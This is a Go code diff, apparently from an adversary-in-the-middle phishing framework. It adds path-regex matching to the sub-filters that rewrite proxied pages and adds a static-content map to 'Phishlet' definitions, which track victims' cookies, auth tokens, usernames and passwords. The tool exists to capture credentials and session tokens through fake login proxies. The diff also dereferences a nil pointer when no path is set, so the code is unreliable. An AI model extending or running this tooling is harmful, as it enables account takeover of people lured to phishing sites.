@@ -24,6 +24,7 @@ type ProxyHost struct {
 type SubFilter struct {
 	subdomain     string
 	domain        string
+	path   *regexp.Regexp
 	mime          []string
 	regexp        string
 	replace       string
@@ -119,6 +120,7 @@ type Phishlet struct {
 	cookieAuthTokens map[string][]*CookieAuthToken
 	bodyAuthTokens   map[string]*BodyAuthToken
 	httpAuthTokens   map[string]*HttpAuthToken
+	staticContents   map[string]*string
 	authUrls         []*regexp.Regexp
 	username         PostField
 	password         PostField
@@ -152,6 +154,7 @@ type ConfigSubFilter struct {
 	Hostname     *string   `mapstructure:"triggers_on"`
 	Sub          *string   `mapstructure:"orig_sub"`
 	Domain       *string   `mapstructure:"domain"`
+	Path         *string   `mapstructure:"path"`
 	Search       *string   `mapstructure:"search"`
 	Replace      *string   `mapstructure:"replace"`
 	Mimes        *[]string `mapstructure:"mimes"`
@@ -460,7 +463,14 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 			for n := range *sf.Mimes {
 				(*sf.Mimes)[n] = p.paramVal((*sf.Mimes)[n])
 			}
-			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
+
+			if sf.Path != nil {
+				*sf.Path = p.paramVal(*sf.Path)
+			} else {
+				*sf.Path = ""
+			}
+
+			p.addSubFilter(p.paramVal(*sf.Hostname), p.paramVal(*sf.Sub), p.paramVal(*sf.Domain), *sf.Path, *sf.Mimes, p.paramVal(*sf.Search), p.paramVal(*sf.Replace), sf.RedirectOnly, *sf.WithParams)
 		}
 	}
 	if fp.JsInject != nil {
@@ -888,14 +898,23 @@ func (p *Phishlet) addProxyHost(phish_subdomain string, orig_subdomain string, d
 	p.proxyHosts = append(p.proxyHosts, ProxyHost{phish_subdomain: phish_subdomain, orig_subdomain: orig_subdomain, domain: domain, handle_session: handle_session, is_landing: is_landing, auto_filter: auto_filter})
 }
 
-func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, mime []string, regexp string, replace string, redirect_only bool, with_params []string) {
+func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string, path string, mime []string, search string, replace string, redirect_only bool, with_params []string) {
 	hostname = strings.ToLower(hostname)
 	subdomain = strings.ToLower(subdomain)
 	domain = strings.ToLower(domain)
 	for n := range mime {
 		mime[n] = strings.ToLower(mime[n])
 	}
-	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only, with_params: with_params})
+	var path_regexp *regexp.Regexp
+	if path != "" {
+		if re, err := regexp.Compile(path); err != nil {
+			log.Error("regexp failed to compile: `%s`", path)
+		} else {
+			path_regexp = re
+		}
+	}
+
+	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, path: path_regexp, mime: mime, regexp: search, replace: replace, redirect_only: redirect_only, with_params: with_params})
 }
 
 func (p *Phishlet) addCookieAuthTokens(hostname string, tokens []string) error {
